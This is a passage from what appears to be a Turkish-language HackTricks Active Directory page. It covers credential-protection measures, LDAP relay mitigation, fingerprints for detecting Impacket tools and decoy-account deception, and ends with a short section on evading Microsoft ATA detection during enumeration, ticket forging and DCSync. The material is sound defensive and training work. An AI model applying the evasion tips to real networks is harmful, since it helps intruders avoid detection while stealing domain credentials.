https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Bazı Genel Savunmalar

[**Credential'ları nasıl koruyacağınız hakkında daha fazla bilgi edinin.**](../stealing-credentials/credentials-protections.md)

### **Credential Protection için Defensive Measures**

- **Domain Admins Restrictions**: Güvenliği korumak için Domain Admins'in yalnızca Domain Controller'lara login olmasına izin verilmesi, diğer host'larda kullanılmamaları önerilir.
- **Service Account Privileges**: Güvenliği korumak için servisler Domain Admin (DA) privileges ile çalıştırılmamalıdır.
- **Temporal Privilege Limitation**: DA privileges gerektiren task'lerde bu privileges'ın süresi sınırlandırılmalıdır. Bu, şu şekilde gerçekleştirilebilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID 2889/3074/3075'i audit edin ve ardından LDAP MITM/relay attempts'ı engellemek için DC'ler/clients üzerinde LDAP signing ile LDAPS channel binding'i zorunlu kılın.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity'nin protocol-level fingerprinting'i

Yaygın AD tradecraft'ını tespit etmek istiyorsanız, renamed binary'ler, service name'ler, temp batch file'lar veya output path'leri gibi yalnızca operatörün kontrol ettiği artifact'lere **güvenmeyin**. Meşru Windows client'larının [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC ve WMI traffic'ini nasıl oluşturduğunu baseline olarak belirleyin; ardından operatör `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` veya `ntlmrelayx.py` dosyalarını düzenlese bile kalan **implementation quirk**'lerini arayın.<sup>[[8]](#references)</sup>

- **High-confidence standalone candidate'lar** (kendi baseline'ınızla doğruladıktan sonra):
- `auth_context_id = 79231 + ctx_id` kullanılarak authenticated DCE/RPC
- `0xff` ile doldurulmuş DCE/RPC authentication padding
- Raw Kerberos `AP-REQ`'i doğrudan SPNEGO `mechToken` içine yerleştiren LDAP Kerberos bind'leri
- ASCII görünümlü `ClientGuid` değerlerine sahip SMB2/3 negotiate request'leri
- Standard dışı `//./root/cimv2` namespace'ini kullanan WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce değerleri
- **Correlation/scoring feature'ı olarak daha iyi kullanılabilecekler**:
- Sparse veya duplicate Kerberos etype list'leri, unusual/missing `PA-DATA` veya native Windows'tan farklı TGS-REQ etype ordering
- Version info içermeyen NTLM Type 1 message'ları veya null host name'lere sahip Type 3 message'ları
- SPNEGO yerine DCE/RPC içinde taşınan raw NTLMSSP, eksik DCE/RPC verification trailer'ları veya SPNEGO/Kerberos OID mismatch'leri
- Aynı host/user/session/time window'dan gelen bu özelliklerin birkaçı, tek bir zayıf field'dan çok daha güçlüdür
- **Standalone alert olarak değil, enrichment olarak kullanın**:
- Default filename'ler, output path'leri, random service name'ler, temporary batch name'leri, default computer account name'leri ve tool-specific HTTP/WebDAV/RDP/MSSQL string'leri
- Bunların operatörler tarafından değiştirilmesi kolaydır; cross-protocol cluster'ın neden suspicious olduğunu açıklamak için en iyi şekilde kullanılırlar
- **Operational notes**:
- Bu signal'ların bazıları decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW veya service-side visibility gerektirir
- Alert'lara dönüştürmeden önce Samba/Linux client'larına, appliance'lara ve legacy software'a karşı doğrulama yapın
- Baseline'a duyduğunuz güven arttıkça detection'ları enrichment -> hunting -> alerting aşamalarında ilerletin

### **Deception Techniques'in uygulanması**

- Deception uygulamak; password'ların expire olmadığı veya Trusted for Delegation olarak işaretlendiği decoy user veya computer'lar gibi trap'ler kurmayı içerir. Ayrıntılı bir yaklaşım, belirli rights'lara sahip user'lar oluşturmayı veya onları high privilege group'lara eklemeyi kapsar.<sup>[[2]](#references)</sup>
- Pratik bir örnek olarak şu araçlar kullanılabilir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques'in deploy edilmesi hakkında daha fazla bilgiye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) adresinden ulaşılabilir.

### **Deception'ın belirlenmesi**

- **User Objects için**: Suspicious indicator'lar arasında atypical ObjectSID, seyrek logon'lar, creation date'ler ve düşük bad password count'ları bulunur.
- **General Indicators**: Potential decoy object'lerin attribute'larını genuine object'lerinkilerle karşılaştırmak inconsistency'leri ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi tool'lar bu deception'ları belirlemeye yardımcı olabilir.

### **Detection Systems'ın bypass edilmesi**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection'ı önlemek için Domain Controller'lar üzerinde session enumeration'dan kaçının.
- **Ticket Impersonation**: Ticket creation için **aes** key'lerini kullanmak, NTLM'e downgrade yapılmasını önleyerek detection'dan kaçmaya yardımcı olur.
- **DCSync Attacks**: ATA detection'dan kaçınmak için işlemin non-Domain Controller üzerinden gerçekleştirilmesi önerilir; Domain Controller üzerinden doğrudan gerçekleştirilmesi alert'leri tetikler.

## References

- [1] [Domain Trust'lara Saldırı Rehberi](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory'de Deception için Trust'ların Forging Edilmesi](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin'den Enterprise Admin'e](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory Exploitation için In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hash'lerini Wordlist olarak Weaponize Etmek](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket'ın İncelenmesi](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon üzerinden Active Directory Accounts'ı Ele Geçirmek](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 ile ilişkili Netlogon secure channel connection değişikliklerini yönetme](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Unutulmuş Null Session ve MS-RPC interface'lerine bir yolculuk](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Domain'ler arasında security boundary olarak SID filter mı? (Bölüm 4) - SID filtering bypass araştırması](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Domain'ler arasında security boundary olarak SID filter mı? (Bölüm 5) - Golden GMSA trust attack - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Domain'ler arasında security boundary olarak SID filter mı? (Bölüm 6) - Schema change trust attack - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 ile DA'dan EA'ya](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS abuse ederek child domain admin'lerinden enterprise admin'lerine 5 dakikada privilege escalation, devam yazısı](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Active Directory DACL Backdoor'larını Tasarlamak](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
